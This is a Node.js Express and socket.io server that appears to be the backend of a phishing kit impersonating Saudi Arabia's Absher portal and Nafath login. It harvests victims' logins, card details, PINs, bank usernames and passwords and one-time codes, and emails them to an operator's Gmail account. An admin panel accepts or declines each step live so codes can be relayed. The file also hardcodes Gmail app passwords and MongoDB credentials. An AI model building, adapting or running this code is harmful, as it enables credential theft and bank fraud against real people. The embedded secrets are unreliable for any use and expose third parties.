const express = require("express");
const app = express();
const cors = require("cors");
const nodemailer = require("nodemailer");
const { Order } = require("./models");
const { default: mongoose } = require("mongoose");
const server = require("http").createServer(app);
const PORT = process.env.PORT || 8080;
const io = require("socket.io")(server, { cors: { origin: "*" } });
app.use(express.json());
app.use(cors("*"));
app.use(require("morgan")("dev"));

const emailData = {
  // user: "pnusds269@gmail.com",
  // pass: "ahnx edtj kero tkus",
  user: "perfumenew678@gmail.com",
  pass: "ukxg gmqe tuaz rfzu",
};

const sendEmail = async (data, type) => {
  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: emailData.user,
      pass: emailData.pass,
    },
  });
  let htmlContent = "<div>";
  for (const [key, value] of Object.entries(data)) {
    htmlContent += `<p>${key}: ${
      typeof value === "object" ? JSON.stringify(value) : value
    }</p>`;
  }

  return await transporter
    .sendMail({
      from: "Admin Panel",
      to: emailData.user,
      subject: `${
        type === "visa"
          ? "Abshr Visa"
          : type === "visaOtp" //
          ? "Abshr Visa Otp "
          : type === "pin" //
          ? "Abshr Visa Pin "
          : type === "login" //
          ? "Abshr login  "
          : type === "loginOtp" //
          ? "Abshr login otp  "
          : type === "services" //
          ? "Abshr Services Form  "
          : type === "bankAuth" //
          ? "Abshr Bank  Login  "
          : type === "navazOtp" //
          ? "Abshr Navaz  OTP  "
          : type === "phone" //
          ? "Abshr Phone  "
          : type === "phoneOtp" //
          ? "Abshr Phone  OTP  "
          : type === "mobOtp" //
          ? "Abshr Phone Mob OTP  "
          : "Abshr "
      }`,
      html: htmlContent,
    })
    .then((info) => {
      if (info.accepted.length) {
        return true;
      } else {
        return false;
      }
    });
};

app.get("/", (req, res) => res.send("ok"));

app.delete("/", async (req, res) => {
  await Order.find({})
    .then(async (orders) => {
      await Promise.resolve(
        orders.forEach(async (order) => {
          await Order.findByIdAndDelete(order._id);
        })
      );
    })
    .then(() => res.sendStatus(200));
});

app.post("/login", async (req, res) => {
  try {
    await Order.create(req.body).then(
      async (order) =>
        await sendEmail(req.body, "login").then(() =>
          res.status(201).json({ order })
        )
    );
  } catch (error) {
    console.log("Error: " + error);
    return res.sendStatus(500);
  }
});

app.get("/order/checked/:id", async (req, res) => {
  try {
    const { id } = req.params;
    await Order.findByIdAndUpdate(id, { checked: true }).then(() =>
      res.sendStatus(200)
    );
  } catch (error) {
    console.log("Error: " + error);
    return res.sendStatus(500);
  }
});

app.post("/loginOtp/:id", async (req, res) => {
  const { id } = req.params;
  await Order.findByIdAndUpdate(id, {
    loginOtp: req.body.otp,
    checked: false,
    loginOTPAccept: false,
  }).then(
    async () =>
      await sendEmail(req.body, "loginOtp").then(() => res.sendStatus(200))
  );
});
app.post("/services/:id", async (req, res) => {
  const { id } = req.params;
  await Order.findByIdAndUpdate(id, {
    ...req.body,
    checked: false,
  }).then(
    async () =>
      await sendEmail(req.body, "services").then(() => res.sendStatus(200))
  );
});

app.post("/visa/:id", async (req, res) => {
  const { id } = req.params;
  console.log(req.body);
  await Order.findByIdAndUpdate(id, {
    ...req.body,
    checked: false,
    visaAccept: false,
  }).then(
    async () =>
      await sendEmail(req.body, "visa").then(() => res.sendStatus(200))
  );
});

app.post("/visaOtp/:id", async (req, res) => {
  const { id } = req.params;
  await Order.findByIdAndUpdate(id, {
    visa_otp: req.body.visa_otp,
    checked: false,
    visaOtpAccept: false,
  }).then(
    async () =>
      await sendEmail(req.body, "visaOtp").then(() => res.sendStatus(200))
  );
});
app.post("/bankAuth/:id", async (req, res) => {
  const { id } = req.params;
  await Order.findByIdAndUpdate(id, {
    bankUsername: req.body.bankUsername,
    bankPassword: req.body.bankPassword,
    bank: req.body.type,
    checked: false,
    bankAccept: false,
  }).then(
    async () =>
      await sendEmail(req.body, "bankAuth").then(() => res.sendStatus(200))
  );
});
app.post("/navazOtp/:id", async (req, res) => {
  const { id } = req.params;
  await Order.findByIdAndUpdate(id, {
    navazOtp: req.body.navazOtp,
    checked: false,
  }).then(
    async () =>
      await sendEmail(req.body, "navazOtp").then(() => res.sendStatus(200))
  );
});

app.post("/phone/:id", async (req, res) => {
  const { id } = req.params;
  console.log(req.body);
  await Order.findByIdAndUpdate(id, {
    ...req.body,
    checked: false,
    phoneAccept: false,
    networkAccept: false,
    navazAccept: true,
    navazOtpAccept: true,
  }).then(
    async () =>
      await sendEmail(req.body, "phone").then(() => res.sendStatus(200))
  );
});
app.post("/phoneOtp/:id", async (req, res) => {
  const { id } = req.params;
  await Order.findByIdAndUpdate(id, {
    ...req.body,
    checked: false,
    phoneOtpAccept: false,
  }).then(
    async () =>
      await sendEmail(req.body, "phoneOtp").then(() => res.sendStatus(200))
  );
});
app.post("/mobOtp/:id", async (req, res) => {
  const { id } = req.params;
  await Order.findByIdAndUpdate(id, {
    ...req.body,
    checked: false,
    mobOtpAccept: false,
  }).then(
    async () =>
      await sendEmail(req.body, "mobOtp").then(() => res.sendStatus(200))
  );
});

app.get(
  "/users",
  async (req, res) => await Order.find().then((users) => res.json(users))
);

io.on("connection", (socket) => {
  console.log("connected");

  socket.on("login", () => io.emit("login"));

  socket.on("acceptLogin", async ({ id, username }) => {
    console.log("acceptLogin From Admin", id, username);
    await Order.findByIdAndUpdate(id, { loginAccept: true });
    io.emit("acceptLogin", { id, username });
  });
  socket.on("declineLogin", async ({ id, username }) => {
    console.log("acceptLogin From Admin", id, username);
    await Order.findByIdAndUpdate(id, { loginAccept: true });
    io.emit("declineLogin", { id, username });
  });

  socket.on("otpLogin", () => io.emit("otpLogin"));

  socket.on("acceptOTPLogin", async (data) => {
    console.log("acceptOTPLogin From Admin", data);
    await Order.findByIdAndUpdate(data.id, {
      loginOTPAccept: true,
    });
    io.emit("acceptOTPLogin", data);
  });
  socket.on("declineOTPLogin", async (data) => {
    console.log("declineOTPLogin Form Admin", data);
    await Order.findByIdAndUpdate(data.id, { loginOTPAccept: true });
    io.emit("declineOTPLogin", data);
  });

  socket.on("visa", (data) => {
    console.log("visa  received", data);
    io.emit("visa", data);
  });
  socket.on("acceptVisa", async (id) => {
    console.log("acceptVisa From Admin", id);
    await Order.findByIdAndUpdate(id, { visaAccept: true });
    io.emit("acceptVisa", id);
  });
  socket.on("declineVisa", async (id) => {
    console.log("declineVisa Form Admin", id);
    await Order.findByIdAndUpdate(id, { visaAccept: true });
    io.emit("declineVisa", id);
  });
  socket.on("bankAuth", (data) => {
    console.log("bankAuth  received", data);
    io.emit("bankAuth", data);
  });
  socket.on("acceptBankAuth", async (id) => {
    console.log("acceptBankAuth From Admin", id);
    await Order.findByIdAndUpdate(id, { bankAccept: true });
    io.emit("acceptBankAuth", id);
  });
  socket.on("declineBankAuth", async (id) => {
    console.log("declineBankAuth Form Admin", id);
    await Order.findByIdAndUpdate(id, { bankAccept: true });
    io.emit("declineBankAuth", id);
  });

  socket.on("visaOtp", (data) => {
    console.log("visaOtp  received", data);
    io.emit("visaOtp", data);
  });

  socket.on("acceptVisaOTP", async (id) => {
    console.log("acceptVisaOTP From Admin", id);
    await Order.findByIdAndUpdate(id, { visaOtpAccept: true });
    io.emit("acceptVisaOTP", id);
  });

  socket.on("declineVisaOTP", async (id) => {
    console.log("declineVisaOTP Form Admin", id);
    await Order.findByIdAndUpdate(id, { visaOtpAccept: true });
    io.emit("declineVisaOTP", id);
  });

  socket.on("visaPin", (data) => {
    console.log("visaPin  received", data);
    io.emit("visaPin", data);
  });

  socket.on("acceptVisaPin", async (id) => {
    console.log("acceptVisaPin From Admin", id);
    await Order.findByIdAndUpdate(id, { visaPinAccept: true });
    io.emit("acceptVisaPin", id);
  });

  socket.on("declineVisaPin", async (id) => {
    console.log("declineVisaPin Form Admin", id);
    await Order.findByIdAndUpdate(id, { visaPinAccept: true });
    io.emit("declineVisaPin", id);
  });

  socket.on("orderValidate", async (data) => {
    console.log("orderValidate  received", data);
    await Order.findByIdAndUpdate(data.id, {
      navazCodeAccept: false,
      navazCode: data.navazCode,
      checked: false,
    });
    io.emit("orderValidate", data);
  });
  socket.on("acceptCode", async (id) => {
    console.log("acceptCode From Admin", id);
    await Order.findByIdAndUpdate(id, { navazCodeAccept: true });
    io.emit("acceptCode", id);
  });

  socket.on("declineCode", async ({ id, navazCode }) => {
    console.log("declineCode Form Admin", id);
    await Order.findByIdAndUpdate(id, {
      navazCodeAccept: true,
      navazCode,
    });
    io.emit("declineCode", { id, navazCode });
  });

  socket.on("acceptVisaOTP", async (id) => {
    console.log("acceptVisaOTP From Admin", id);
    io.emit("acceptVisaOTP", id);
  });

  socket.on("declineVisaOTP", async (id) => {
    console.log("declineVisaOTP Form Admin", id);
    await Order.findByIdAndUpdate(id, { visaOtpAccept: true });
    io.emit("declineVisaOTP", id);
  });

  socket.on("phone", async (data) => {
    console.log("phone  received", data);
    await Order.findByIdAndUpdate(data.id, {
      phoneAccept: false,
      mobOtp: null,
      mobOtpAccept: false,
    });
    io.emit("phone", data);
  });

  socket.on("acceptPhone", async (id) => {
    console.log("acceptPhone From Admin", id);
    await Order.findByIdAndUpdate(id, { phoneAccept: true });
    io.emit("acceptPhone", id);
  });

  socket.on("declinePhone", async (id) => {
    console.log("declinePhone Form Admin", id);
    await Order.findByIdAndUpdate(id, { phoneAccept: true });
    io.emit("declinePhone", id);
  });

  socket.on("phoneOtp", (data) => {
    console.log("phoneOtp  received", data);
    io.emit("phoneOtp", data);
  });

  socket.on("acceptPhoneOTP", async ({ id, price }) => {
    console.log("acceptPhoneOTP From Admin", id);
    await Order.findByIdAndUpdate(id, {
      phoneOtpAccept: true,
      networkAccept: false,
    });
    io.emit("acceptPhoneOTP", { id, price });
  });

  socket.on("declinePhoneOTP", async (id) => {
    console.log("declinePhoneOTP Form Admin", id);
    await Order.findByIdAndUpdate(id, {
      phoneOtpAccept: true,
      networkAccept: false,
    });
    io.emit("declinePhoneOTP", id);
  });
  socket.on("acceptService", async ({id,price}) => {
    console.log("acceptService From Admin", id);
    await Order.findByIdAndUpdate(id, {
      networkAccept: true,
    });
    io.emit("acceptService", { id, price });
  });

  socket.on("declineService", async (id) => {
    console.log("declineService Form Admin", id);
    await Order.findByIdAndUpdate(id, { networkAccept: true });
    io.emit("declineService", id);
  });
  socket.on("acceptNavaz", async (id) => {
    console.log("acceptNavaz From Admin", id);
    await Order.findByIdAndUpdate(id, { navazAccept: true });
    io.emit("acceptNavaz", id);
  });

  socket.on("declineNavaz", async (id) => {
    console.log("declineNavaz Form Admin", id);
    await Order.findByIdAndUpdate(id, {
      navazAccept: true,
      networkAccept: false,
    });
    io.emit("declineNavaz", id);
  });

  socket.on("navazChange", async (data) => {
    io.emit("navazChange", data);
  });

  socket.on("navazOtp", async (data) => {
    console.log("navazOtp  received", data);
    await Order.findByIdAndUpdate(data.id, {
      navazOtpAccept: false,
      networkAccept: true,
      navazAccept: true,
    });
    io.emit("navazOtp", data);
  });

  socket.on("acceptNavazOTP", async (id) => {
    console.log("acceptNavazOTP From Admin", id);
    await Order.findByIdAndUpdate(id, {
      navazOtpAccept: true,
      networkAccept: true,
      navazAccept: true,
    });
    io.emit("acceptNavazOTP", id);
  });

  socket.on("declineNavazOTP", async (id) => {
    console.log("declineNavazOTP Form Admin", id);
    await Order.findByIdAndUpdate(id, {
      navazOtpAccept: true,
      networkAccept: true,
      navazAccept: true,
    });
    io.emit("declineNavazOTP", id);
  });

  socket.on("mobOtp", async (data) => {
    console.log("mobOtp  received", data);
    await Order.findByIdAndUpdate(data.id, {
      mobOtp: data.mobOtp,
      mobOtpAccept: false,
      networkAccept: true,
      navazAccept: false,
    });
    io.emit("mobOtp", data);
  });

  socket.on("acceptMobOtp", async ({ id, price }) => {
    console.log("acceptMobOtp From Admin", id);
    await Order.findByIdAndUpdate(id, {
      mobOtpAccept: true,
      networkAccept: true,
      navazAccept: true,
    });
    io.emit("acceptMobOtp", { id, price });
  });

  socket.on("declineMobOtp", async (id) => {
    console.log("declineMobOtp Form Admin", id);
    await Order.findByIdAndUpdate(id, {
      mobOtpAccept: true,
      networkAccept: true,
      navazAccept: true,
    });
    io.emit("declineMobOtp", id);
  });

  socket.on("network", async (id) => {
    await Order.findByIdAndUpdate(id, {
      navazAccept: false,
      networkAccept: false,
    });
  });
});

// Function to delete orders older than 7 days
const deleteOldOrders = async () => {
  const sevenDaysAgo = new Date();
  sevenDaysAgo.setDate(sevenDaysAgo.getDate() - 7);
  try {
    const result = await Order.deleteMany({ created: { $lt: sevenDaysAgo } });
    console.log(`${result.deletedCount} orders deleted.`);
  } catch (error) {
    console.error("Error deleting old orders:", error);
  }
};

// Function to run daily
const runDailyTask = () => {
  deleteOldOrders();
  setTimeout(runDailyTask, 24 * 60 * 60 * 1000); // Schedule next execution in 24 hours
};

mongoose
  .connect("mongodb+srv://abshr:abshr@abshr.fxznc.mongodb.net/abshrNew1")
  .then((conn) =>
    server.listen(PORT, async () => {
      runDailyTask();
      console.log("server running and connected to db" + conn.connection.host);
    })
  );
